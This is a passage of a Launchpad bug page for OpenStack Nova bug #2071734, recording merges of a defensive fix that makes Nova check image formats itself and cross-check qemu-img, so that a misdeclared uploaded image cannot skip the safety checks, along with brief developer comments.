            <time itemprop="commentTime" datetime="2024-07-23T23:40:07.497993+00:00" title="2024-07-23 23:40:07 UTC">on 2024-07-23</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/95">
                <strong>Fix merged to nova (master)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/95"> #95</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924731">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924731</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/nova/commit/8b4c522f6699514e7d1f20ac25cf426af6ea588f">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />nova/commit/<wbr />8b4c522f6699514<wbr />e7d1f20ac25cf42<wbr />6af6ea588f</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    master</p>
<p>commit 8b4c522f6699514<wbr />e7d1f20ac25cf42<wbr />6af6ea588f<br />
Author: Dan Smith &lt;email address hidden&gt;<br />
Date:   Wed Jul 10 14:23:33 2024 +0100</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change force_format strategy to catch mismatches</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;When we moved the qemu-img command in fetch_to_raw() to force the<br />
&nbsp;&nbsp;&nbsp;&nbsp;format to what we expect, we lost the ability to identify and react<br />
&nbsp;&nbsp;&nbsp;&nbsp;to situations where qemu-img detected a file as a format that is not<br />
&nbsp;&nbsp;&nbsp;&nbsp;supported by us (i.e. identfied and safety-checked by<br />
&nbsp;&nbsp;&nbsp;&nbsp;format_<wbr />inspector)<wbr />. In the case of some of the other VMDK variants<br />
&nbsp;&nbsp;&nbsp;&nbsp;that we don&#x27;t support, we need to be sure to catch any case where<br />
&nbsp;&nbsp;&nbsp;&nbsp;qemu-img thinks it&#x27;s something other than raw when we think it is,<br />
&nbsp;&nbsp;&nbsp;&nbsp;which will be the case for those formats we don&#x27;t support.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Note this also moves us from explicitly using the format_inspector<br />
&nbsp;&nbsp;&nbsp;&nbsp;that we&#x27;re told by glance is appropriate, to using our own detection.<br />
&nbsp;&nbsp;&nbsp;&nbsp;We assert that we agree with glance and as above, qemu agrees with<br />
&nbsp;&nbsp;&nbsp;&nbsp;us. This helps us avoid cases where the uploader lies about the<br />
&nbsp;&nbsp;&nbsp;&nbsp;image format, causing us to not run the appropriate safety check.<br />
&nbsp;&nbsp;&nbsp;&nbsp;AMI formats are a liability here since we have a very hard time<br />
&nbsp;&nbsp;&nbsp;&nbsp;asserting what they are and what they will be detected as later in<br />
&nbsp;&nbsp;&nbsp;&nbsp;the pipeline, so there is still special-casing for those.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Closes-Bug: #2071734<br />
&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I4b792c5bc959a9<wbr />04854c21565682e<wbr />d3a687baa1a</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/nova/+/924731
Committed: https://opendev.org/openstack/nova/commit/8b4c522f6699514e7d1f20ac25cf426af6ea588f
Submitter: "Zuul (22348)"
Branch:    master

commit 8b4c522f6699514e7d1f20ac25cf426af6ea588f
Author: Dan Smith &lt;dansmith@redhat.com&gt;
Date:   Wed Jul 10 14:23:33 2024 +0100

    Change force_format strategy to catch mismatches
    
    When we moved the qemu-img command in fetch_to_raw() to force the
    format to what we expect, we lost the ability to identify and react
    to situations where qemu-img detected a file as a format that is not
    supported by us (i.e. identfied and safety-checked by
    format_inspector). In the case of some of the other VMDK variants
    that we don't support, we need to be sure to catch any case where
    qemu-img thinks it's something other than raw when we think it is,
    which will be the case for those formats we don't support.
    
    Note this also moves us from explicitly using the format_inspector
    that we're told by glance is appropriate, to using our own detection.
    We assert that we agree with glance and as above, qemu agrees with
    us. This helps us avoid cases where the uploader lies about the
    image format, causing us to not run the appropriate safety check.
    AMI formats are a liability here since we have a very hard time
    asserting what they are and what they will be detected as later in
    the pipeline, so there is still special-casing for those.
    
    Closes-Bug: #2071734
    Change-Id: I4b792c5bc959a904854c21565682ed3a687baa1a
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in nova: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        In Progress &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/96" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~oseibert-sys11" class="sprite person">Olaf Seibert (oseibert-sys11)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-24T08:23:12.619021+00:00" title="2024-07-24 08:23:12 UTC">on 2024-07-24</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/96"> #96</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Also see <a rel="nofollow" href="https://bugs.launchpad.net/cinder/+bug/2073413">https:/<wbr />/bugs.launchpad<wbr />.net/cinder/<wbr />+bug/2073413</a> for more bugs in the image inspector...</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Also see https://bugs.launchpad.net/cinder/+bug/2073413 for more bugs in the image inspector...</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/97" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-24T10:03:58.545271+00:00" title="2024-07-24 10:03:58 UTC">on 2024-07-24</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/97"> #97</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>that may or may not impact nova as we currently have 3 copies of the format_inspector (we are creating a 4th in oslo.utils which we will all swap too)</p>
<p>that is not currently a bug as we do not intend to modify the I_FEATURES_MAX_BIT in the future in any of the intree impelmations but it is a design consideration for the oslo.utils version</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">that may or may not impact nova as we currently have 3 copies of the format_inspector (we are creating a 4th in oslo.utils which we will all swap too)

that is not currently a bug as we do not intend to modify the I_FEATURES_MAX_BIT in the future in any of the intree impelmations but it is a design consideration for the oslo.utils version
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/98" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-24T10:29:54.664731+00:00" title="2024-07-24 10:29:54 UTC">on 2024-07-24</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/98">
                <strong>Change abandoned on nova (master)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/98"> #98</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Change abandoned by &quot;sean mooney &lt;email address hidden&gt;&quot; on branch: master<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924746">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924746</a><br />
Reason: this is not needed for this job but it may be useful for other jobs</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Change abandoned by "sean mooney &lt;smooney@redhat.com&gt;" on branch: master
Review: https://review.opendev.org/c/openstack/nova/+/924746
Reason: this is not needed for this job but it may be useful for other jobs</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/99" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-24T20:30:36.303709+00:00" title="2024-07-24 20:30:36 UTC">on 2024-07-24</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/99">
                <strong>Fix merged to nova (stable/2024.1)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/99"> #99</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924732">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924732</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/nova/commit/8ef5ec9716c9edbd662ca27b6e39b7848b14f492">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />nova/commit/<wbr />8ef5ec9716c9edb<wbr />d662ca27b6e39b7<wbr />848b14f492</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    stable/2024.1</p>
<p>commit 8ef5ec9716c9edb<wbr />d662ca27b6e39b7<wbr />848b14f492<br />
Author: Dan Smith &lt;email address hidden&gt;<br />
Date:   Wed Jul 10 14:23:33 2024 +0100</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change force_format strategy to catch mismatches</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;When we moved the qemu-img command in fetch_to_raw() to force the<br />
&nbsp;&nbsp;&nbsp;&nbsp;format to what we expect, we lost the ability to identify and react<br />
&nbsp;&nbsp;&nbsp;&nbsp;to situations where qemu-img detected a file as a format that is not<br />
&nbsp;&nbsp;&nbsp;&nbsp;supported by us (i.e. identfied and safety-checked by<br />
&nbsp;&nbsp;&nbsp;&nbsp;format_<wbr />inspector)<wbr />. In the case of some of the other VMDK variants<br />
&nbsp;&nbsp;&nbsp;&nbsp;that we don&#x27;t support, we need to be sure to catch any case where<br />
&nbsp;&nbsp;&nbsp;&nbsp;qemu-img thinks it&#x27;s something other than raw when we think it is,<br />
&nbsp;&nbsp;&nbsp;&nbsp;which will be the case for those formats we don&#x27;t support.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Note this also moves us from explicitly using the format_inspector<br />
&nbsp;&nbsp;&nbsp;&nbsp;that we&#x27;re told by glance is appropriate, to using our own detection.<br />
&nbsp;&nbsp;&nbsp;&nbsp;We assert that we agree with glance and as above, qemu agrees with<br />
&nbsp;&nbsp;&nbsp;&nbsp;us. This helps us avoid cases where the uploader lies about the<br />
&nbsp;&nbsp;&nbsp;&nbsp;image format, causing us to not run the appropriate safety check.<br />
&nbsp;&nbsp;&nbsp;&nbsp;AMI formats are a liability here since we have a very hard time<br />
&nbsp;&nbsp;&nbsp;&nbsp;asserting what they are and what they will be detected as later in<br />
&nbsp;&nbsp;&nbsp;&nbsp;the pipeline, so there is still special-casing for those.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Closes-Bug: #2071734<br />
&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I4b792c5bc959a9<wbr />04854c21565682e<wbr />d3a687baa1a<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 8b4c522f6699514<wbr />e7d1f20ac25cf42<wbr />6af6ea588f)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/nova/+/924732
Committed: https://opendev.org/openstack/nova/commit/8ef5ec9716c9edbd662ca27b6e39b7848b14f492
Submitter: "Zuul (22348)"
Branch:    stable/2024.1

commit 8ef5ec9716c9edbd662ca27b6e39b7848b14f492
Author: Dan Smith &lt;dansmith@redhat.com&gt;
Date:   Wed Jul 10 14:23:33 2024 +0100

    Change force_format strategy to catch mismatches
    
    When we moved the qemu-img command in fetch_to_raw() to force the
    format to what we expect, we lost the ability to identify and react
    to situations where qemu-img detected a file as a format that is not
    supported by us (i.e. identfied and safety-checked by
    format_inspector). In the case of some of the other VMDK variants
    that we don't support, we need to be sure to catch any case where
    qemu-img thinks it's something other than raw when we think it is,
    which will be the case for those formats we don't support.
    
    Note this also moves us from explicitly using the format_inspector
    that we're told by glance is appropriate, to using our own detection.
    We assert that we agree with glance and as above, qemu agrees with
    us. This helps us avoid cases where the uploader lies about the
    image format, causing us to not run the appropriate safety check.
    AMI formats are a liability here since we have a very hard time
    asserting what they are and what they will be detected as later in
    the pipeline, so there is still special-casing for those.
    
    Closes-Bug: #2071734
    Change-Id: I4b792c5bc959a904854c21565682ed3a687baa1a
    (cherry picked from commit 8b4c522f6699514e7d1f20ac25cf426af6ea588f)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/100" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-25T14:11:34.034591+00:00" title="2024-07-25 14:11:34 UTC">on 2024-07-25</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/100">
                <strong>Fix merged to nova (stable/2023.2)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/100"> #100</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924733">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924733</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/nova/commit/45d948938314997ba400a5fc2bb48bc821c260ab">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />nova/commit/<wbr />45d948938314997<wbr />ba400a5fc2bb48b<wbr />c821c260ab</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    stable/2023.2</p>
<p>commit 45d948938314997<wbr />ba400a5fc2bb48b<wbr />c821c260ab<br />
Author: Dan Smith &lt;email address hidden&gt;<br />
Date:   Wed Jul 10 14:23:33 2024 +0100</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change force_format strategy to catch mismatches</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;When we moved the qemu-img command in fetch_to_raw() to force the<br />
&nbsp;&nbsp;&nbsp;&nbsp;format to what we expect, we lost the ability to identify and react<br />
&nbsp;&nbsp;&nbsp;&nbsp;to situations where qemu-img detected a file as a format that is not<br />
&nbsp;&nbsp;&nbsp;&nbsp;supported by us (i.e. identfied and safety-checked by<br />
&nbsp;&nbsp;&nbsp;&nbsp;format_<wbr />inspector)<wbr />. In the case of some of the other VMDK variants<br />
&nbsp;&nbsp;&nbsp;&nbsp;that we don&#x27;t support, we need to be sure to catch any case where<br />
&nbsp;&nbsp;&nbsp;&nbsp;qemu-img thinks it&#x27;s something other than raw when we think it is,<br />
&nbsp;&nbsp;&nbsp;&nbsp;which will be the case for those formats we don&#x27;t support.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Note this also moves us from explicitly using the format_inspector<br />
&nbsp;&nbsp;&nbsp;&nbsp;that we&#x27;re told by glance is appropriate, to using our own detection.<br />
&nbsp;&nbsp;&nbsp;&nbsp;We assert that we agree with glance and as above, qemu agrees with<br />
&nbsp;&nbsp;&nbsp;&nbsp;us. This helps us avoid cases where the uploader lies about the<br />
&nbsp;&nbsp;&nbsp;&nbsp;image format, causing us to not run the appropriate safety check.<br />
&nbsp;&nbsp;&nbsp;&nbsp;AMI formats are a liability here since we have a very hard time<br />
&nbsp;&nbsp;&nbsp;&nbsp;asserting what they are and what they will be detected as later in<br />
&nbsp;&nbsp;&nbsp;&nbsp;the pipeline, so there is still special-casing for those.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Closes-Bug: #2071734<br />
&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I4b792c5bc959a9<wbr />04854c21565682e<wbr />d3a687baa1a<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 8b4c522f6699514<wbr />e7d1f20ac25cf42<wbr />6af6ea588f)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 8ef5ec9716c9edb<wbr />d662ca27b6e39b7<wbr />848b14f492)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/nova/+/924733
Committed: https://opendev.org/openstack/nova/commit/45d948938314997ba400a5fc2bb48bc821c260ab
Submitter: "Zuul (22348)"
Branch:    stable/2023.2

commit 45d948938314997ba400a5fc2bb48bc821c260ab
Author: Dan Smith &lt;dansmith@redhat.com&gt;
Date:   Wed Jul 10 14:23:33 2024 +0100

    Change force_format strategy to catch mismatches
    
    When we moved the qemu-img command in fetch_to_raw() to force the
    format to what we expect, we lost the ability to identify and react
    to situations where qemu-img detected a file as a format that is not
    supported by us (i.e. identfied and safety-checked by
    format_inspector). In the case of some of the other VMDK variants
    that we don't support, we need to be sure to catch any case where
    qemu-img thinks it's something other than raw when we think it is,
    which will be the case for those formats we don't support.
    
    Note this also moves us from explicitly using the format_inspector
    that we're told by glance is appropriate, to using our own detection.
    We assert that we agree with glance and as above, qemu agrees with
    us. This helps us avoid cases where the uploader lies about the
    image format, causing us to not run the appropriate safety check.
    AMI formats are a liability here since we have a very hard time
    asserting what they are and what they will be detected as later in
    the pipeline, so there is still special-casing for those.
    
    Closes-Bug: #2071734
    Change-Id: I4b792c5bc959a904854c21565682ed3a687baa1a
    (cherry picked from commit 8b4c522f6699514e7d1f20ac25cf426af6ea588f)
    (cherry picked from commit 8ef5ec9716c9edbd662ca27b6e39b7848b14f492)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/101" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-25T19:18:13.561407+00:00" title="2024-07-25 19:18:13 UTC">on 2024-07-25</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/101">
                <strong>Fix merged to nova (stable/2023.1)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/101"> #101</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924734">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924734</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/nova/commit/fbe429051e1fbcd494c71525870651e92e121449">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />nova/commit/<wbr />fbe429051e1fbcd<wbr />494c71525870651<wbr />e92e121449</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    stable/2023.1</p>
<p>commit fbe429051e1fbcd<wbr />494c71525870651<wbr />e92e121449<br />
Author: Dan Smith &lt;email address hidden&gt;<br />
Date:   Wed Jul 10 14:23:33 2024 +0100</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change force_format strategy to catch mismatches</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;When we moved the qemu-img command in fetch_to_raw() to force the<br />
&nbsp;&nbsp;&nbsp;&nbsp;format to what we expect, we lost the ability to identify and react<br />
&nbsp;&nbsp;&nbsp;&nbsp;to situations where qemu-img detected a file as a format that is not<br />
&nbsp;&nbsp;&nbsp;&nbsp;supported by us (i.e. identfied and safety-checked by<br />
&nbsp;&nbsp;&nbsp;&nbsp;format_<wbr />inspector)<wbr />. In the case of some of the other VMDK variants<br />
&nbsp;&nbsp;&nbsp;&nbsp;that we don&#x27;t support, we need to be sure to catch any case where<br />
&nbsp;&nbsp;&nbsp;&nbsp;qemu-img thinks it&#x27;s something other than raw when we think it is,<br />
&nbsp;&nbsp;&nbsp;&nbsp;which will be the case for those formats we don&#x27;t support.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Note this also moves us from explicitly using the format_inspector<br />
&nbsp;&nbsp;&nbsp;&nbsp;that we&#x27;re told by glance is appropriate, to using our own detection.<br />
&nbsp;&nbsp;&nbsp;&nbsp;We assert that we agree with glance and as above, qemu agrees with<br />
&nbsp;&nbsp;&nbsp;&nbsp;us. This helps us avoid cases where the uploader lies about the<br />
&nbsp;&nbsp;&nbsp;&nbsp;image format, causing us to not run the appropriate safety check.<br />
&nbsp;&nbsp;&nbsp;&nbsp;AMI formats are a liability here since we have a very hard time<br />
&nbsp;&nbsp;&nbsp;&nbsp;asserting what they are and what they will be detected as later in<br />
&nbsp;&nbsp;&nbsp;&nbsp;the pipeline, so there is still special-casing for those.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Closes-Bug: #2071734<br />
&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I4b792c5bc959a9<wbr />04854c21565682e<wbr />d3a687baa1a<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 8b4c522f6699514<wbr />e7d1f20ac25cf42<wbr />6af6ea588f)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 8ef5ec9716c9edb<wbr />d662ca27b6e39b7<wbr />848b14f492)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 45d948938314997<wbr />ba400a5fc2bb48b<wbr />c821c260ab)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/nova/+/924734
Committed: https://opendev.org/openstack/nova/commit/fbe429051e1fbcd494c71525870651e92e121449
Submitter: "Zuul (22348)"
Branch:    stable/2023.1

commit fbe429051e1fbcd494c71525870651e92e121449
Author: Dan Smith &lt;dansmith@redhat.com&gt;
Date:   Wed Jul 10 14:23:33 2024 +0100

    Change force_format strategy to catch mismatches
    
    When we moved the qemu-img command in fetch_to_raw() to force the
    format to what we expect, we lost the ability to identify and react
    to situations where qemu-img detected a file as a format that is not
    supported by us (i.e. identfied and safety-checked by
    format_inspector). In the case of some of the other VMDK variants
    that we don't support, we need to be sure to catch any case where
    qemu-img thinks it's something other than raw when we think it is,
    which will be the case for those formats we don't support.
    
    Note this also moves us from explicitly using the format_inspector
    that we're told by glance is appropriate, to using our own detection.
    We assert that we agree with glance and as above, qemu agrees with
    us. This helps us avoid cases where the uploader lies about the
    image format, causing us to not run the appropriate safety check.
    AMI formats are a liability here since we have a very hard time
    asserting what they are and what they will be detected as later in
    the pipeline, so there is still special-casing for those.
    
    Closes-Bug: #2071734
    Change-Id: I4b792c5bc959a904854c21565682ed3a687baa1a
    (cherry picked from commit 8b4c522f6699514e7d1f20ac25cf426af6ea588f)
    (cherry picked from commit 8ef5ec9716c9edbd662ca27b6e39b7848b14f492)
    (cherry picked from commit 45d948938314997ba400a5fc2bb48bc821c260ab)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
